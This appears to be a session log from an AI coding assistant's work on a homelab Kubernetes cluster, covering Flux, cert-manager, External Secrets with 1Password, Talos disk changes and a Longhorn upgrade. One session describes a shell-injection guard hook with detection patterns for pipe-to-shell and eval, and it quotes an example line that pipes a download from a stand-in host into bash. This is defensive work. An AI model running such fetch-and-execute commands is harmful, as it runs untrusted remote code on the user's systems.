Audit ROADMAP.md and remove items that have already been implemented.

### What we did
- Queried live cluster via MCP Kubernetes tools: listed all Kustomizations and namespaces
- Confirmed `external-secrets`, `onepassword-connect`, `onepassword-store` Kustomizations all `Ready: True` — ESO + 1Password Connect fully operational
- Confirmed `cluster-vars` Kustomization `Ready: True` (51s old at check time) — cluster-level variable substitution fully implemented by the previous session
- Verified three remaining bykaj patterns are still open: Global HelmRelease Defaults Patch (not present in `ks.yaml`), Kustomize Components (`kubernetes/components/` absent), Split Renovate Config (`.renovate/` absent)
- Removed "External Secrets + 1Password Connect" section from "In Progress"
- Removed "Cluster-Level Variable Substitution" section from "Researched Patterns"
- Added both items to the Completed table with descriptive notes
- Updated Persistent Storage Stage 4 note: ESO no longer a blocker
- Updated dependency chain diagram: added ✅ to `cert-manager`, `external-secrets`, `onepassword-connect`
- Updated Monitoring dependencies: ESO noted as ✅ already running, placeholder receiver note removed

### Files changed
| File | Change |
|------|--------|
| `docs/ROADMAP.md` | Removed two completed sections; added two Completed table rows; updated dependency chain and cross-references throughout |
| `docs/SESSIONS.md` | Opened roadmap-cleanup stub |
| `CLAUDE.md` | Added roadmap-cleanup row to session log table |

### Key decisions
- Verified cluster state live (MCP tools) before editing the ROADMAP rather than trusting docs alone — `cluster-vars` was already Ready at 51s, confirming the previous session's work landed correctly
- Kept the three remaining bykaj patterns (Global HelmRelease Defaults, Kustomize Components, Split Renovate) in the open roadmap — none are implemented, all still represent valid future work

---

## 2026-05-14 — `cluster-issuers-debug`

### Goal
Diagnose why the 'cluster-issuers' Flux Kustomization is not reported as Ready.

### What we did
- Fetched `cluster-issuers` Kustomization via MCP Kubernetes tool — `observedGeneration: -1`, stuck in `Reconciling` running health checks on both ClusterIssuers
- Used `kubectl get clusterissuer` to find root cause: both `READY: False` with `Failed to register ACME account: 400 ... invalidContact` — literal placeholder values `TODO_YOUR_EMAIL` and `TODO_YOUR_DOMAIN` rejected by Let's Encrypt
- Confirmed `cert-manager-cloudflare` ExternalSecret was healthy (`SecretSynced: True`) — Cloudflare API token was not the issue
- Read both ClusterIssuer YAML files to confirm the placeholder values
- User chose to fix via cluster-level variable substitution (ROADMAP item) rather than hardcoding — combined fix implements the pattern and resolves the issuer in one go
- Read ROADMAP.md: confirmed `kubernetes/flux/cluster/ks.yaml` already had the `substituteFrom` patch wired; `cluster-settings` ConfigMap and `cluster-secrets` Secret were the missing pieces
- Created `kubernetes/flux/vars/` with `cluster-settings.yaml` (ConfigMap: `CLUSTER_NAME`, `CLUSTER_TIMEZONE`) and `cluster-secrets.sops.yaml` (Secret: `CLUSTER_DOMAIN=vwn.io`, `CLUSTER_ACME_EMAIL=letsencrypt@bvw.email`); encrypted with SOPS; verified decrypt round-trip
- Added `cluster-vars` Kustomization to `cluster/ks.yaml` (depends on `cluster-meta`, SOPS decryption enabled, `targetNamespace: flux-system`); updated `cluster-apps` to depend on `cluster-vars`, uncommented its SOPS decryption block, added `optional: true` to both `substituteFrom` entries
- Removed `substitution.flux.home.arpa/disabled: "true"` label from `cluster-issuers/ks.yaml` so the `postBuild` patch now applies to it
- Replaced `TODO_YOUR_EMAIL` → `${CLUSTER_ACME_EMAIL}` and `TODO_YOUR_DOMAIN` → `${CLUSTER_DOMAIN}` in both ClusterIssuer files
- Added `task bootstrap:sops-age` to `.taskfiles/bootstrap/Taskfile.yaml`
- Ran `task bootstrap:sops-age` to create `sops-age` Secret in `flux-system` (prerequisite for SOPS decryption in Flux) — confirmed created; stale ACME private key Secrets left in place for cert-manager to reuse

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/vars/kustomization.yaml` | Created — Kustomize entry-point for vars layer |
| `kubernetes/flux/vars/cluster-settings.yaml` | Created — ConfigMap with `CLUSTER_NAME` and `CLUSTER_TIMEZONE` |
| `kubernetes/flux/vars/cluster-secrets.sops.yaml` | Created — SOPS-encrypted Secret with `CLUSTER_DOMAIN` and `CLUSTER_ACME_EMAIL` |
| `kubernetes/flux/cluster/ks.yaml` | Added `cluster-vars` Kustomization; `cluster-apps` now depends on it with SOPS decryption enabled and `optional: true` on substituteFrom |
| `kubernetes/apps/cert-manager/cluster-issuers/ks.yaml` | Removed `substitution.flux.home.arpa/disabled: "true"` label |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-staging.yaml` | Replaced TODO placeholders with `${CLUSTER_ACME_EMAIL}` and `${CLUSTER_DOMAIN}` |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-production.yaml` | Replaced TODO placeholders with `${CLUSTER_ACME_EMAIL}` and `${CLUSTER_DOMAIN}` |
| `.taskfiles/bootstrap/Taskfile.yaml` | Added `sops-age` task |

### Key decisions
- Combined ClusterIssuer fix with the cluster-variable-substitution ROADMAP item — values stay out of Git and the substitution mechanism is reusable for all future apps
- Domain and ACME email placed in SOPS-encrypted Secret (not ConfigMap) following the ROADMAP convention: "domain names, host addresses" go in the secret tier
- `optional: true` on both `substituteFrom` entries so child Kustomizations degrade gracefully rather than hard-failing if `cluster-vars` hasn't reconciled yet (safety valve during bootstrap or if SOPS secret is temporarily missing)
- Stale ACME private key Secrets (`letsencrypt-staging`, `letsencrypt-production`) left in place — cert-manager reuses existing keys on retry; Let's Encrypt registers a fresh account for the same key pair with the correct email

---

## 2026-05-14 — `permission-hooks-setup`

### Goal
Consolidate Claude Code permission settings from settings.local.json into the project settings.json and add a PreToolUse shell-injection guard hook.

### What we did
- Ran `/fewer-permission-prompts` skill: scanned 50 JSONL transcripts, extracted Bash + MCP tool-call frequencies; identified `kubectl get *`, `kubectl logs *`, `talosctl get *`, `flux get *`, and 4 kubernetes MCP tools as high-value allowlist candidates
- Discovered initial `settings.json` entries lacked the required `Bash()` wrapper — Claude Code permission rules are tool-namespaced; bare strings like `"kubectl get *"` are silently ignored by the harness
- User revealed `.claude/settings.local.json` (gitignored, schema-unvalidated); merged its full content into `.claude/settings.json` (checked-in, schema-validated project file)
- Audited merged allowlist: removed 7 redundant entries where narrower rules were shadowed by broader ones (e.g. `Bash(talosctl get *)` covered by `Bash(talosctl *)`, four specific KUBECONFIG+kubectl exact commands covered by the wildcard form)
- Added `Bash(git push *)` to `permissions.deny` inside `permissions`; schema validation caught first attempt placing it at the wrong top-level scope
- Cleared `settings.local.json` to `{}`; all config now consolidated in the checked-in `settings.json`
- Created `.claude/hooks/check-shell-injection.sh`: PreToolUse hook detecting 4 injection patterns — pipe to shell interpreter, `eval`, curl/wget piped to shell, `source /dev/stdin`; uses `{"continue":false,"stopReason":"..."}` JSON protocol matching the existing SOPS hook
- Hook suggests a ready-to-paste allowlist entry (`"Bash(<command>)"`) when blocking so the user can permanently allow a specific command if intentional
- Added allowlist-bypass logic: discovered broad wildcards (e.g. `Bash(curl *)`) would silently bypass injection checks; fixed to exact-match-only so wildcards reduce prompts without granting blanket trust through the guard
- Wired hook into `settings.json` PreToolUse Bash hooks array; ran 4-case test suite — all passed after fixing a `\-` typo in the test that produced invalid JSON

### Files changed
| File | Change |
|------|--------|
| `.claude/settings.json` | Created; merged from settings.local.json; removed 7 redundant allow entries; added `deny: [Bash(git push *)]`; wired shell-injection hook |
| `.claude/settings.local.json` | Cleared to `{}` |
| `.claude/hooks/check-shell-injection.sh` | Created; PreToolUse guard for 4 shell injection patterns with exact-match allowlist bypass and allowlist-entry suggestion on block |

### Key decisions
- `Bash()` wrapper is required — without it entries are silently ignored; non-obvious from casual reading of the settings schema
- Hook allowlist bypass uses exact-match only, not wildcards — `Bash(curl *)` in the allow list would have silently passed `curl https://evil.sh | bash`; exact-match-only prevents broad wildcards from defeating injection checks
- Permission system is a friction/convenience layer, not a security sandbox — hooks are the actual enforcement mechanism; both layers serve different purposes

---

## 2026-05-14 — `cluster-variables-research`

### Goal
Research how other homelab repositories implement cluster-level variables (domains, settings) to avoid duplication, and evaluate patterns for adoption in this cluster.

### What we did
- Cloned two reference repos into `tmp/`: `qnimbus/home-ops.old` and `bykaj/home-ops` for hands-on analysis
- Mapped the core substitution mechanism in both repos: a patch on the root `cluster-apps` Kustomization injects `postBuild.substituteFrom` (referencing `cluster-settings` ConfigMap + `cluster-secrets` Secret) into every child Kustomization automatically; apps use `${VAR_NAME}` tokens without per-app wiring
- Confirmed that `kubernetes/flux/cluster/ks.yaml` already has this patch wired — the ConfigMap and Secret simply don't exist yet
- Identified four additional patterns in bykaj worth adopting: (1) cluster-vars substitution, (2) global HelmRelease defaults patch (crds, remediation, timeouts), (3) Kustomize Components for reusable boilerplate, (4) split Renovate config into `.renovate/` directory
- Analysed the chicken-and-egg problem with sourcing `cluster-secrets` from ESO/1Password: circular dependency (ESO must be deployed before the Secret exists, but Flux needs the Secret to deploy apps including ESO); confirmed SOPS is the correct approach
- Inspected bykaj's `components/namespace/secret.sops.yaml` — confirmed no private key embedded; only the encrypted session key + age public recipient appear in the file
- Documented all four patterns in `docs/ROADMAP.md` as independently addressable items with concrete implementation steps
- Drew up a full implementation plan for cluster-vars in `.claude/plans/` (not yet executed)

### Files changed
| File | Change |
|------|--------|
| `docs/ROADMAP.md` | Added `## Researched Patterns (bykaj/home-ops)` section with 4 pattern subsections |
| `docs/SESSIONS.md` | Session stub prepended |
| `CLAUDE.md` | Session log row added |

### Key decisions
- SOPS over ESO/1Password for `cluster-secrets`: avoids bootstrap chicken-and-egg; SOPS decrypts before any apps reconcile, ESO approach requires `optional: true` + fragile ordering
- Split ConfigMap (plaintext) + SOPS Secret rather than bykaj's single all-encrypted Secret: non-sensitive vars (CIDRs, timezone) stay readable in PRs; only domain names and host addresses warrant encryption
- Session was research-and-document only; implementation deferred to a future session

---

## 2026-05-13 — `eso-onepassword-connect-fix`

### Goal
Fix the `ClusterSecretStore/onepassword` which was stuck in `ValidationFailed / Ready=False` due to two bugs: a double-encoding error in the 1Password Connect credentials secret, and a wrong vault name in the ClusterSecretStore spec.

### What we did
- Used cluster-doctor agent to diagnose the warning; root cause: `1password-credentials.json` stored as raw JSON, but 1Password Connect requires it to be base64-encoded JSON (the `credentialsDataFromBase64` function in Connect needs another layer of encoding on top of what Kubernetes already does)
- Imperatively patched the live `onepassword-connect-secrets` secret: re-encoded the value from `base64(raw_json)` to `base64(base64(raw_json))` so the env var Connect receives is `base64(raw_json)` as expected
- Restarted the `onepassword-connect` deployment to pick up the updated secret; Connect API began returning 200 OK with no errors
- Discovered a second error after credentials fix: `Found 0 vaults with title "Kubernetes"` — the ClusterSecretStore spec had `vaults: Kubernetes: 1` but the actual 1Password vault name is `homelab`
- Fixed `clustersecretstore.yaml`: `Kubernetes` → `homelab`
- Fixed `task bootstrap:onepassword-connect-secret`: added `| base64 -w 0` to the credentials `op read` so re-running the task produces a correctly double-encoded secret; also fixed the `[VAULT=Kubernetes]` description tag to `[VAULT=homelab]`
- After token renewal in 1Password and re-running the task, discovered `onepassword-store` Kustomization had been stuck for hours — cluster-doctor confirmed Connect was returning `[]` for vault list because the Connect integration had no vault access granted; fix was adding `homelab` vault access in 1Password admin UI
- Switched namespace creation in the task from client-side `kubectl apply` to `--server-side` to eliminate a cosmetic annotation warning (namespace was created by Flux, lacked `last-applied-configuration`)

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/external-secrets/external-secrets/stores/onepassword/clustersecretstore.yaml` | `vaults: Kubernetes: 1` → `vaults: homelab: 1` |
| `.taskfiles/bootstrap/Taskfile.yaml` | `onepassword-connect-secret`: added `\| base64 -w 0` to credentials encoding; fixed VAULT default and description tag; switched namespace apply to `--server-side` |

### Key decisions
- **Imperative patch acceptable for the secret**: the secret is deliberately not in Git (Option B decision from prior session); patching it imperatively is the correct fix path
- **Double-encoding is by design**: 1Password Connect reads its credentials file content as base64, so the secret value must be `base64(raw_json)` — requiring Kubernetes to store it as `base64(base64(raw_json))`
- **ClusterSecretStore vault name**: must match the exact vault title in 1Password as Connect returns it; case-sensitive

---

## 2026-05-13 — `bootstrap-components-gitops`

### Goal
Port all six bootstrap components (Cilium, CoreDNS, Spegel, cert-manager, flux-operator, flux-instance) from Helmfile-only management to full Flux HelmReleases, so they receive automatic upgrades via Renovate PRs like every other cluster component.

### What we did
- Used cluster-doctor agent to audit live component versions against `docs/CLUSTER.md`; found Longhorn documented as v1.9.0 (running v1.11.2) and OpenEBS as v4.3.2 (running v4.4.0); fixed both entries in CLUSTER.md
- Investigated the bootstrap Helmfile's version-drift problem: Renovate comments in the Helmfile had bumped pins (e.g. Cilium 1.19.3) but without Flux HelmReleases there was no mechanism to apply those bumps to the running cluster
- As an interim step, created `scripts/upgrade-bootstrap.sh` and `bootstrap:diff`/`bootstrap:upgrade` Taskfile tasks; on reflection these were then removed because running `helmfile sync` on a live cluster with Flux HelmReleases would cause Flux to immediately reconcile back — the two systems would fight
- Compared with the archive cluster and confirmed it had full OCIRepository+HelmRelease for all six bootstrap components — the current repo lost those files during the initial port from the archive
- Decided to port the archive pattern back; `scripts/upgrade-bootstrap.sh` and the `bootstrap:diff`/`bootstrap:upgrade` tasks were removed before the final commit
- Added three new OCI source files to `flux/meta/repos/oci/`: `cert-manager.yaml`, `flux-operator.yaml`, `flux-instance.yaml`
- Updated `coredns.yaml` and `spegel.yaml` in meta OCI repos: replaced `semver: >=x.x.x` with pinned `tag:` + `layerSelector` + Renovate comment
- Updated `flux/meta/repos/oci/kustomization.yaml` to include all five new/updated sources
- Created full Flux Kustomization + HelmRelease trees for all six components:
  - `kube-system/cilium/` — uses existing HelmRepository `cilium`; version `1.17.6`
  - `kube-system/coredns/` — uses OCIRepository `coredns` via `chartRef`; tag `1.43.0`
  - `kube-system/spegel/` — uses OCIRepository `spegel` via `chartRef`; tag `0.4.0`
  - `cert-manager/cert-manager/` — uses new OCIRepository `cert-manager`; tag `v1.17.2`; `crds: CreateReplace`
  - `flux-system/flux-operator/` — uses new OCIRepository `flux-operator`; tag `0.23.0`
  - `flux-system/flux-instance/` — uses new OCIRepository `flux-instance`; tag `0.23.0`; `dependsOn: flux-operator`
- Created `kubernetes/apps/kube-system/kustomization.yaml` and `kubernetes/apps/flux-system/kustomization.yaml`
- Updated root `kubernetes/apps/kustomization.yaml`: added `./flux-system` and `./kube-system`
- Updated `kubernetes/apps/cert-manager/kustomization.yaml`: added `./cert-manager/ks.yaml`
- Removed all `# renovate:` comments from `kubernetes/bootstrap/helmfile.yaml` — Helmfile is now a static bootstrap ladder; Renovate tracks the meta OCI/Helm repo objects instead
- Removed `scripts/upgrade-bootstrap.sh` and `bootstrap:diff`/`bootstrap:upgrade` tasks — would conflict with Flux on a live cluster (Helmfile upgrades; Flux immediately reconciles back to HelmRelease version); updated `bootstrap:apps` description to reflect that day-2 upgrades now go via Flux/Renovate
- Verified reconciliation: forced `flux reconcile` after push; all six new Kustomizations reached `Ready=True` within 35 seconds; all six HelmReleases show `Helm upgrade succeeded` at the pinned versions (`.v2` release — Flux adopted the pre-existing Helmfile-installed `.v1` release with a no-op upgrade); no pod restarts

### Files changed
| File | Change |
|------|--------|
| `docs/CLUSTER.md` | Longhorn version corrected v1.9.0→v1.11.2; OpenEBS v4.3.2→v4.4.0 |
| `.taskfiles/bootstrap/Taskfile.yaml` | Updated `bootstrap:apps` description: day-2 upgrades via Flux/Renovate, not Helmfile |
| `kubernetes/flux/meta/repos/oci/coredns.yaml` | semver → pinned tag `1.43.0` + layerSelector + Renovate comment |
| `kubernetes/flux/meta/repos/oci/spegel.yaml` | semver → pinned tag `0.4.0` + layerSelector + Renovate comment |
| `kubernetes/flux/meta/repos/oci/cert-manager.yaml` | New — OCIRepository for `quay.io/jetstack/charts/cert-manager` |
| `kubernetes/flux/meta/repos/oci/flux-operator.yaml` | New — OCIRepository for `ghcr.io/controlplaneio-fluxcd/charts/flux-operator` |
| `kubernetes/flux/meta/repos/oci/flux-instance.yaml` | New — OCIRepository for `ghcr.io/controlplaneio-fluxcd/charts/flux-instance` |
| `kubernetes/flux/meta/repos/oci/kustomization.yaml` | Added cert-manager, flux-operator, flux-instance |
| `kubernetes/apps/kube-system/kustomization.yaml` | New — references cilium/coredns/spegel ks.yaml |
| `kubernetes/apps/kube-system/cilium/ks.yaml` | New — Flux Kustomization |
| `kubernetes/apps/kube-system/cilium/app/helmrelease.yaml` | New — HelmRelease v1.17.6 via HelmRepository |
| `kubernetes/apps/kube-system/cilium/app/kustomization.yaml` | New — configMapGenerator |
| `kubernetes/apps/kube-system/cilium/app/helm/kustomizeconfig.yaml` | New — nameReference config |
| `kubernetes/apps/kube-system/coredns/ks.yaml` | New |
| `kubernetes/apps/kube-system/coredns/app/helmrelease.yaml` | New — chartRef OCIRepository |
| `kubernetes/apps/kube-system/coredns/app/kustomization.yaml` | New |
| `kubernetes/apps/kube-system/coredns/app/helm/kustomizeconfig.yaml` | New |
| `kubernetes/apps/kube-system/spegel/ks.yaml` | New |
| `kubernetes/apps/kube-system/spegel/app/helmrelease.yaml` | New — chartRef OCIRepository |
| `kubernetes/apps/kube-system/spegel/app/kustomization.yaml` | New |
| `kubernetes/apps/kube-system/spegel/app/helm/kustomizeconfig.yaml` | New |
| `kubernetes/apps/cert-manager/cert-manager/ks.yaml` | New — wait: true; healthChecks on HelmRelease |
| `kubernetes/apps/cert-manager/cert-manager/app/helmrelease.yaml` | New — chartRef OCIRepository; crds: CreateReplace |
| `kubernetes/apps/cert-manager/cert-manager/app/kustomization.yaml` | New |
| `kubernetes/apps/cert-manager/cert-manager/app/helm/kustomizeconfig.yaml` | New |
| `kubernetes/apps/flux-system/kustomization.yaml` | New — references flux-operator/flux-instance ks.yaml |
| `kubernetes/apps/flux-system/flux-operator/ks.yaml` | New |
| `kubernetes/apps/flux-system/flux-operator/app/helmrelease.yaml` | New — chartRef OCIRepository |
| `kubernetes/apps/flux-system/flux-operator/app/kustomization.yaml` | New |
| `kubernetes/apps/flux-system/flux-operator/app/helm/kustomizeconfig.yaml` | New |
| `kubernetes/apps/flux-system/flux-instance/ks.yaml` | New — dependsOn: flux-operator |
| `kubernetes/apps/flux-system/flux-instance/app/helmrelease.yaml` | New — chartRef OCIRepository; dependsOn: flux-operator |
| `kubernetes/apps/flux-system/flux-instance/app/kustomization.yaml` | New |
| `kubernetes/apps/flux-system/flux-instance/app/helm/kustomizeconfig.yaml` | New |
| `kubernetes/apps/kustomization.yaml` | Added `./flux-system` and `./kube-system` |
| `kubernetes/apps/cert-manager/kustomization.yaml` | Added `./cert-manager/ks.yaml` |
| `kubernetes/bootstrap/helmfile.yaml` | Removed all `# renovate:` comments |

### Key decisions
- **Pin at currently running versions**: HelmReleases start at live versions so the first Flux reconcile is a no-op; Renovate opens upgrade PRs from there
- **OCIRepository for cert-manager** (not HelmRepository): consistent with how CoreDNS/Spegel/flux-operator are sourced; OCI is the vendor-preferred distribution channel
- **Renovate comments removed from Helmfile**: the Helmfile is now a static bootstrap ladder; version tracking moves entirely to the Flux source objects in `flux/meta/repos/`
- **`scripts/upgrade-bootstrap.sh` and `bootstrap:diff`/`bootstrap:upgrade` removed**: would fight Flux on a live cluster — Helmfile upgrades to newer pin, Flux reconciles back to HelmRelease version; no safe use case remains once HelmReleases exist
- **First reconcile is a no-op by design**: all HelmReleases pinned at currently running versions; Flux adopted the Helmfile-installed releases without restarting any pods; Renovate will open separate PRs for each version gap going forward

---

## 2026-05-13 — `cert-manager-cluster-issuer`

### Goal
Configure cert-manager with a Let's Encrypt ClusterIssuer (DNS-01 via Cloudflare) as part of the Ingress Infrastructure roadmap item — prerequisite for Cilium Gateway API, Cloudflare Tunnel, and all HTTPS workloads.

### What we did
- Scope expanded from "just ClusterIssuers" to the full prerequisite stack after user requested 1Password instead of SOPS for the Cloudflare API token
- Added two new HelmRepositories: `external-secrets` (charts.external-secrets.io) and `onepassword-connect` (1password.github.io/connect-helm-charts)
- Deployed **External Secrets Operator** (chart `external-secrets` 0.18.2) as a Flux-managed HelmRelease in the new `external-secrets` namespace
- Deployed **1Password Connect** (chart `connect` 2.0.1) as a Flux-managed HelmRelease
- Created **ClusterSecretStore** `onepassword` pointing at `http://onepassword-connect.external-secrets.svc.cluster.local:8080`, vault `Kubernetes`
- Authored multi-doc `external-secrets/ks.yaml` with two Kustomizations: `external-secrets` (ESO HelmRelease) and `onepassword-store` (ClusterSecretStore, dependsOn both ESO + Connect)
- Created **ExternalSecret** `cert-manager-cloudflare` (in `cert-manager` namespace) pulling 1Password vault item `cloudflare`, key `api-token` → Secret `cert-manager-secret`
- Created **ClusterIssuer** `letsencrypt-staging` and `letsencrypt-production`; both use DNS-01 via Cloudflare, `cert-manager-secret/api-token`; email and domain are `TODO_*` placeholders
- `cluster-issuers` Kustomization `dependsOn: [onepassword-store]` so ExternalSecret can resolve before cert-manager tries to use the token
- Reviewed all files against cluster patterns; fixed: Renovate comment format (`datasource=helm depName=... repository=...`), install remediation (`retries: -1` not `3`), added `upgrade.cleanupOnFail: true`, slimmed values.yaml to only non-default overrides, bumped cluster-issuers timeout 2m→5m for ACME registration
- Added `.taskfiles/sops/Taskfile.yaml` with a `sops:encrypt` task: resolves `op://` references in a `*.sops.yaml.tpl` via `op inject | sops --filename-override ... --encrypt /dev/stdin` and writes the encrypted output alongside it; `sops` include wired into root `Taskfile.yaml`
- Created `onepassword-connect/app/secret.sops.yaml.tpl` with `op://Kubernetes/...` references for the Connect credentials — committed as documentation; the encrypted output is **not** committed
- Switched to **Option B** (imperative bootstrap, no Git secret): removed `secret.sops.yaml` from git and from the `onepassword-connect` Kustomization; removed `decryption` block from `onepassword-connect/ks.yaml` (now has no SOPS resources); added `task bootstrap:onepassword-connect-secret` which creates the `onepassword-connect-secrets` Secret directly via `op read` (idempotent `--dry-run=client | kubectl apply`); Flux never sees the Secret so `prune: true` will never delete it

### Files changed
| File | Change |
|------|--------|
| `kubernetes/flux/meta/repos/helm/external-secrets.yaml` | New — HelmRepository for ESO |
| `kubernetes/flux/meta/repos/helm/onepassword-connect.yaml` | New — HelmRepository for 1Password Connect |
| `kubernetes/flux/meta/repos/helm/kustomization.yaml` | Added both new repo files |
| `kubernetes/apps/external-secrets/kustomization.yaml` | New — namespace-level kustomize entry |
| `kubernetes/apps/external-secrets/external-secrets/ks.yaml` | New — 2-doc: ESO + onepassword-store Kustomizations |
| `kubernetes/apps/external-secrets/external-secrets/app/namespace.yaml` | New — creates external-secrets namespace |
| `kubernetes/apps/external-secrets/external-secrets/app/helmrelease.yaml` | New — ESO HelmRelease |
| `kubernetes/apps/external-secrets/external-secrets/app/helm/values.yaml` | New — `installCRDs: true` only |
| `kubernetes/apps/external-secrets/external-secrets/app/helm/kustomize-config.yaml` | New — nameReference for configMapGenerator |
| `kubernetes/apps/external-secrets/external-secrets/app/kustomization.yaml` | New — configMapGenerator + resources |
| `kubernetes/apps/external-secrets/external-secrets/stores/onepassword/clustersecretstore.yaml` | New — ClusterSecretStore `onepassword` |
| `kubernetes/apps/external-secrets/external-secrets/stores/onepassword/kustomization.yaml` | New |
| `kubernetes/apps/external-secrets/onepassword-connect/ks.yaml` | New — Kustomization; no `decryption` block (Option B: credentials never in git) |
| `kubernetes/apps/external-secrets/onepassword-connect/app/secret.sops.yaml.tpl` | New — op:// reference template; documents 1Password item names; safe to commit |
| `kubernetes/apps/external-secrets/onepassword-connect/app/helmrelease.yaml` | New — 1Password Connect HelmRelease |
| `kubernetes/apps/external-secrets/onepassword-connect/app/helm/values.yaml` | New — ClusterIP + resource limits |
| `kubernetes/apps/external-secrets/onepassword-connect/app/helm/kustomize-config.yaml` | New — nameReference for configMapGenerator |
| `kubernetes/apps/external-secrets/onepassword-connect/app/kustomization.yaml` | New — configMapGenerator + resources (no secret.sops.yaml) |
| `kubernetes/apps/cert-manager/kustomization.yaml` | New — namespace-level kustomize entry |
| `kubernetes/apps/cert-manager/cluster-issuers/ks.yaml` | New — cluster-issuers Kustomization, dependsOn onepassword-store |
| `kubernetes/apps/cert-manager/cluster-issuers/app/kustomization.yaml` | New |
| `kubernetes/apps/cert-manager/cluster-issuers/app/externalsecret.yaml` | New — ExternalSecret pulling cloudflare/api-token |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-staging.yaml` | New — letsencrypt-staging ClusterIssuer (TODO placeholders) |
| `kubernetes/apps/cert-manager/cluster-issuers/app/clusterissuer-production.yaml` | New — letsencrypt-production ClusterIssuer (TODO placeholders) |
| `kubernetes/apps/kustomization.yaml` | Added `./cert-manager` and `./external-secrets` |
| `.taskfiles/sops/Taskfile.yaml` | New — `sops:encrypt` task; `op inject \| sops --filename-override --encrypt` |
| `.taskfiles/bootstrap/Taskfile.yaml` | Added `bootstrap:onepassword-connect-secret` task |
| `Taskfile.yaml` | Added `sops` include |
| `CLAUDE.md` | Updated session log table |

### Key decisions
- **1Password over SOPS for app secrets**: user preference; correct long-term pattern; the Connect bootstrap credentials are the only chicken-and-egg secret (needed before ESO runs)
- **Option B — imperative bootstrap secret**: `task bootstrap:onepassword-connect-secret` creates `onepassword-connect-secrets` via `op read` directly into the cluster; nothing is stored in git or Flux inventory; `prune: true` cannot delete what Flux never applied
- **`secret.sops.yaml.tpl` committed as docs**: the `op://` template is safe to commit (no secrets); it documents which 1Password items to create and serves as the `op inject` source for anyone who wants to use Option A (SOPS-in-git) instead
- **`operator.create: false` in Connect values**: 1Password Operator is distinct from Connect and not needed; ESO handles secret sync natively
- **`install.remediation.retries: -1` on ESO**: ESO webhook cert bootstrap often fails the first reconcile attempt; infinite retries avoids a permanently-failed HelmRelease during first-time install

---

## 2026-05-13 — `cp01-disk-role-swap`

### Goal
Swap disk roles on cp-01: move the Kingston SNV3S1000G to Longhorn storage and the GoodRam IRDM PRO NANO (IRP-SSDPR-P44N-01T-30) to Talos system disk. Also pre-configure cp-02 for the same swap once its Crucial P310 arrives.

### What we did
- Used cluster-doctor agent to verify live disk state: confirmed Kingston was system disk and GoodRam was Longhorn storage (opposite of user's recollection — roles were correctly inverted)
- Retrieved Kingston serial (`50026B7686F8B787`) via `talosctl get disks --nodes 10.60.0.201`
- Updated `talconfig.yaml` for cp-01: `installDiskSelector` → `IRP-SSDPR-P44N-01T-30` (GoodRam); `machine.disks` → Kingston by-id path
- Added TODO comment to cp-02 `installDiskSelector` for when the Crucial P310 1TB 2230 arrives
- Discovered `talhelper genconfig` (and `gencommand apply`) blocked: talhelper 3.1.9 has an embedded Talos version list compiled before v1.13.2 was released — no workaround via flags; no newer talhelper release available
- Worked around by manually editing `talos/clusterconfig/kubernetes-talos-cp-01.yaml` (gitignored generated file): updated `diskSelector`, `machine.disks` device path, installer image tag (v1.13.0→v1.13.2), and temporarily added `wipe: true`
- Downloaded correct Talos v1.13.2 ISO via `task talos:iso` (same schematic ID, correct version)
- User ISO-booted cp-01, applied config via `talosctl apply-config` directly (bypassing broken `talhelper gencommand apply`)
- Verified migration success: Kingston mounted at `/var/mnt/longhorn-storage` (XFS), node `Ready` in Kubernetes
- Removed `wipe: true` from talconfig.yaml and clusterconfig after successful reboot
- Added ISO-boot disk-swap migration procedure to `CLUSTER.md` for future reference (cp-02)
- Updated disk inventory in `CLUSTER.md` and `ROADMAP.md` to reflect new live roles

### Files changed
| File | Change |
|------|--------|
| `talos/talconfig.yaml` | cp-01: `installDiskSelector` → GoodRam model; `machine.disks` → Kingston by-id; cp-02: TODO comment for Crucial P310 |
| `docs/CLUSTER.md` | Disk inventory table corrected to live roles; ISO-boot migration procedure added |
| `docs/ROADMAP.md` | Disk inventory updated; cp-01 storage status changed from pending to live |

### Key decisions
- **GoodRam as system, Kingston as storage**: user explicitly wanted faster Kingston for Longhorn I/O; GoodRam adequate for OS
- **talhelper workaround**: manual clusterconfig edit justified because talhelper 3.1.9 predates Talos v1.13.2 and has no skip-validate flag; the edit is temporary and will be superseded by a proper `genconfig` once talhelper 3.1.10 ships
- **`wipe: true` required**: GoodRam had existing Longhorn partition; Talos installer refuses non-Talos disks without it; removed immediately after migration

---

## 2026-05-13 — `longhorn-1.11.2-upgrade`

### Goal
Execute the Longhorn 1.9.0 → 1.11.2 upgrade: fix two blocking defects in the helmrelease (missing `crds: CreateReplace`, tight instance-manager memory limit), verify CRD storedVersions on the live cluster, push fixes to the PR #19 branch, merge, and reconcile.

### What we did
- Verified all 22 Longhorn CRDs show only `v1beta2` storedVersions — no migration script needed
- Added `crds: CreateReplace` to both `install` and `upgrade` blocks in `helmrelease.yaml` (CLAUDE.md convention; also ensures CRD schemas actually update on upgrade)
- Raised `longhornInstanceManager.resources.limits.memory` from 64Mi → 128Mi (v1.11.x adds S.M.A.R.T. disk-health monitoring per node)
- Updated values.yaml chart reference comment from `v1.9.x` to `v1.11.x`
- Committed fixes to `renovate/longhorn-1.x` branch; user pushed and merged PR #19
- **Discovered**: Longhorn enforces a one-minor-version-at-a-time upgrade gate in the manager binary — direct 1.9→1.11 is rejected at startup with fatal error; the pr-upgrade-reviewer agent incorrectly stated direct upgrade was supported
- First merge failed: HelmRelease timed out (5m); Flux initiated rollback; HelmRelease suspended to stop retry cycle; cluster returned to healthy 1.9.0
- Executed staged upgrade: 1.9.0 → 1.10.2 (intermediate hop, separate commit) → 1.11.2
- Both hops succeeded via `flux reconcile ks longhorn --with-source`; all pods healthy at 1.11.2

### Files changed
| File | Change |
|------|--------|
| `kubernetes/apps/longhorn-system/longhorn/app/helmrelease.yaml` | `crds: CreateReplace` added; version: 1.9.0 → 1.10.2 → 1.11.2 (staged) |
| `kubernetes/apps/longhorn-system/longhorn/app/helm/values.yaml` | instance-manager memory limit 64Mi → 128Mi; chart comment updated to v1.11.x |

### Key decisions
- **Staged upgrade required**: Longhorn only supports one minor version at a time (manager binary enforces this, not a chart-level check). The upgrade path was 1.9.0 → 1.10.2 → 1.11.2, not direct.
